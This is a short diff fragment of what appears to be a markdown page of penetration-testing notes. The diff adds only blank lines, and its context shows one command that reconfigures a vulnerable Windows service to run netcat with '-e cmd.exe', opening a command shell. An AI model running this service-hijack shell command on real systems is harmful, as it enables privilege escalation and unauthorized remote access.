@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:37:52.272360+00:00'
 ```bash
 $ sc config <vuln-service> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
 ```
+
+
